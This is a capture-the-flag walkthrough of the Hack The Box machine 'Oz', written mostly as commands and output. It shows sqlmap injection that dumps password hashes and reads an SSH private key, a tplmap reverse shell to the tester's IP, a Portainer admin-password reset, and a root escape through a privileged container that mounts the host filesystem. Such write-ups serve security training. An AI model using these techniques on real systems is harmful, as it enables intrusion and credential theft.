# Oz
[![Oz](https://www.hackthebox.eu/storage/avatars/58f516e793394d6df9f6d5d56e9b7ac6.png)](https://www.hackthebox.eu/home/machines/profile/152)

## Initial Foothold
### Nmap
We run nmap.
```sh
$ nmap -A -v 10.10.10.96
80/tcp   open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
|_http-favicon: Unknown favicon MD5: 74DEB5B89F2D7EEE2CB1F05597640DE7
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET POST
|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
|_http-title: OZ webapi
|_http-trane-info: Problem with XML parsing of /evox/about
8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
|_http-favicon: Unknown favicon MD5: 131B03077D7717DBFF2E41E52F08BC7A
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-title: GBR Support - Login
|_Requested resource was http://10.10.10.96:8080/login
|_http-trane-info: Problem with XML parsing of /evox/about
```

If we open it through a browser and try to find directories, we eventually see that the server is set up to respond randomly in different requests. If we pay attention to responses, we realize that they return a single line. So if we only hide responses that return a single line we might get something.
```sh
$ wfuzz -c -z file,/usr/share/dirb/wordlists/common.txt --hl 0 http://10.10.10.96/FUZZ

********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.96/FUZZ
Total requests: 4614

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000001:  C=200      3 L	       6 W	     75 Ch	  ""
004245:  C=200      3 L	       6 W	     79 Ch	  "users"
````
Directory "users" seem to return different results. Indeed, if we view page source code there are more than one lines.
Now we can run dirb on this directory.
```sh
$ dirb http://10.10.10.96/users

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

---- Scanning URL: http://10.10.10.96/users/ ----

+ http://10.10.10.96/users/admin (CODE:200|SIZE:21)
```

We suspect that here might be a parameter, because of the json results we got, so why not try to inject.
```sh
$ sqlmap --risk 3 -u 10.10.10.96/users/admin --dump

+----+-------------+----------------------------------------------------------------------------------------+
| id | username    | password                                                                               |
+----+-------------+----------------------------------------------------------------------------------------+
| 1  | dorthi      | $pbkdf2-sha256$5000$aA3h3LvXOseYk3IupVQKgQ$ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78 |
| 2  | tin.man     | $pbkdf2-sha256$5000$GgNACCFkDOE8B4AwZgzBuA$IXewCMHWhf7ktju5Sw.W.ZWMyHYAJ5mpvWialENXofk |
| 3  | wizard.oz   | $pbkdf2-sha256$5000$BCDkXKuVMgaAEMJ4z5mzdg$GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY |
| 4  | coward.lyon | $pbkdf2-sha256$5000$bU2JsVYqpbT2PqcUQmjN.Q$hO7DfQLTL6Nq2MeKei39Jn0ddmqly3uBxO/tbBuw4DY |
| 5  | toto        | $pbkdf2-sha256$5000$Zax17l1Lac25V6oVwnjPWQ$oTYQQVsuSz9kmFggpAWB0yrKsMdPjvfob9NfBq4Wtkg |
| 6  | admin       | $pbkdf2-sha256$5000$d47xHsP4P6eUUgoh5BzjfA$jWgyYmxDK.slJYUTsv9V9xZ3WWwcl9EBOsz.bARwGBQ |
+----+-------------+----------------------------------------------------------------------------------------+
```
After a lot time of cracking hashes, for some, we come up with a password.
```sh
$ echo '$pbkdf2-sha256$5000$BCDkXKuVMgaAEMJ4z5mzdg$GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY' > hash
$ john -form:PBKDF2-HMAC-SHA256 hash /usr/share/wordlists/rockyou.txt

wizardofoz22
```
From the sqlmap dump we did previously "sqlmap --risk 3 -u 10.10.10.96/users/admin --dump", we can see the ticket bellow:
```
Reissued new id_rsa and id_rsa.pub keys for ssh access to dorthi.
```
It is worthwhile to take a look if ssh keys are forgotten in dorthi's home directory.
```sh
$ sqlmap --risk 3 -u 10.10.10.96/users/admin --file-read=/home/dorthi/.ssh/id_rsa
```
Good, now we have a private ssh key for user dorthi but yet, it is passphrase protected and we don't have the credentials plus, port 22 it's not even open.
Back to the web api on port 8080 we login like wizard.oz
```
username: wizard.oz
password: wizardofoz22
```
At the top right of the page there is an add button from wich we should be able to create new ticket.
If we take a look at nmaps results, we see this:
```
http-server-header: Werkzeug/0.14.1 Python/2.7.14
```
The server use python [Template](http://jinja.pocoo.org/docs/2.10/templates/) which might be injectable.
The tool we are going to use is tplmap and it can be found [here](https://github.com/epinna/tplmap).
```sh
$ nc -lvp 5656
$ python2.7 tplmap.py -u "http://10.10.10.96:8080" -d "name=skata*&desc=skatd*" -c "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU0MzU4MzQyNX0.BYHb6iO2zGT6jlgI89QmxUX8n1bDizJdDiRDD021BUo" --reverse-shell 10.10.14.16 5656
```
The values of the POST request are random and the token is the cookie of the current user session.

***Warning!*** The token expire after some time.

We now got a reverse shell. If we dig around a bit, we will figure out that we are inside a [docker](https://www.docker.com/) container. After some very basic enumeration we find some credentials as well as a port knock sequence (probably for the port 22), on the corresponding paths.
```sh
$ cat /containers/database/start.sh
-e MYSQL_USER=dorthi \
-e MYSQL_PASSWORD=N0Pl4c3L1keH0me \

$ cat /.secret/knockd.conf
sequence	= 40809:udp,50212:udp,46969:udp
```
Lets try port knocking and see if any ports open.
```sh
$ apt install knockd
$ knock 10.10.10.96 40809:udp 50212:udp 46969:udp
$ nmap -A -v 10.10.10.96
Discovered open port 80/tcp on 10.10.10.96
Discovered open port 22/tcp on 10.10.10.96
Discovered open port 8080/tcp on 10.10.10.96
```
As we can see along with ports 80 and 8080, port 22 is now opened.
Lets connect with [ssh](/Oz/rsa_id).

***Warning!*** The port will close after 15 seconds.
```sh
$ chmod 500 id_rsa
$ knock 10.10.10.96 40809:udp 50212:udp 46969:udp
$ ssh -i rsa_id dorthi@10.10.10.96
Enter passphrase for key 'id_rsa': N0Pl4c3L1keH0me
```
Finally... we have ssh connection.
Running the command bellow, we see that we can execute some docker commands as root.
```sh
$ sudo -l
User dorthi may run the following commands on Oz:
    (ALL) NOPASSWD: /usr/bin/docker network inspect *
    (ALL) NOPASSWD: /usr/bin/docker network ls
```
We first run the ls command to check what networks are created and then we can inspect a specific network.
```sh
$ sudo /usr/bin/docker network ls
NETWORK ID          NAME                DRIVER              SCOPE
fb9c66028c43        bridge              bridge              local
49c1b0c16723        host                host                local
3ccc2aa17acf        none                null                local
48148eb6a512        prodnet             bridge              local

$ sudo /usr/bin/docker network inspect fb9c66028c43
"Name": "portainer-1.11.1",
"EndpointID": "6f700a3e7c7a7ae3b8accd6e89b1fd495da7805473901af9c71cbb02a1e4eafb",
"MacAddress": "02:42:ac:11:00:02",
"IPv4Address": "172.17.0.2/16",
"IPv6Address": ""
```
The machine is running portainer-1.11.1 web app on 172.17.0.2, where Portainer is a GUI for docker management.
All that remains now is to find the port and do ssh tuneling so we can have local access via our web browser.
```sh
$ nmap -A -v 172.17.0.2
Discovered open port 9000/tcp on 172.17.0.2
```
Great, portainer is running on port 9000, the default one.
Let's do the tunneling.
```sh
$ exit
$ knock 10.10.10.96 40809:udp 50212:udp 46969:udp
$ ssh -L 9000:172.17.0.2:9000 -i rsa_id dorthi@10.10.10.96
Enter passphrase for key 'id_rsa': N0Pl4c3L1keH0me
```
Once we are logged in, we open up the browser and type.
```
127.0.0.1:9000
```
Now we have to login somehow. After some googling, [found out](https://gist.github.com/deviantony/77026d402366b4b43fa5918d41bc42f8) that you can initialize the admin password.
Run this from the remote machine.
```sh
$ http POST 172.17.0.2:9000/api/users/admin/init Username="admin" Password="adminpassword"
HTTP/1.1 200 OK
Content-Length: 0
Content-Type: text/plain; charset=utf-8
Date: Thu, 06 Dec 2018 15:44:53 GMT
```
Now we can login with:
```
username: admin
password: adminpassword
```
Hit Login. Given the fact that Portainer is running as root, we can exploit the volumes feature. Volumes in docker let us share directories and files between host and container and while root doing that, we can share any file and directory we want.
Before we create a new container, we memorize a name of the listed images so we can put it on the next step. We click on ***Containers -> Add container***.
![portainer1](./images/Screenshot_2018-12-06_18-01-46.png)

Then we set ***Name, Image ***(the image name we memorized before)***, Entry Point, Working Dir, User, Console***, as in the image bellow.
![portainer2](./images/Screenshot_2018-12-06_18-04-23.png)

We move on to the ***Volumes*** tab and we set the following. ***Add volume button -> tick Path checkbox -> set path "/" for host -> set path "/host" for container***. What we did is shared the root directory of the host machine with a specific directory inside the container which name is "host" (a random name).
![portainer3](./images/Screenshot_2018-12-06_18-05-52.png)

Finally, on Security/Host tab we check the ***Privileged mode*** box and click ***Create***.
![portainer4](./images/Screenshot_2018-12-06_18-06-15.png)

Back in ***Containers*** tab again, we find our container we just created and click on its name.
![portainer5](./images/Screenshot_2018-12-06_18-06-51.png)

On ***Container details*** page, we click on ***console***.
![portainer6](./images/Screenshot_2018-12-06_18-07-08.png)

Next, hit ***Connect***.
![portainer7](./images/Screenshot_2018-12-06_18-07-27.png)

Now, we have an ***Interactive TTY*** session on our container.
Final step.
```sh
$ cat /host/root/root.txt
bGVsZWxlbGVsZWxlbGVsZWxlbGVsZWxlbGVsZWxlbGVsZWxlbGVsZWxlbGVsZWxl
```
We got ***ROOT!!!***   



[![bertolis](https://www.hackthebox.eu/badge/image/27897)](https://www.hackthebox.eu/home/users/profile/27897)  [![Oz](https://www.hackthebox.eu/images/logofull-tr-web.png)](https://www.hackthebox.eu/)
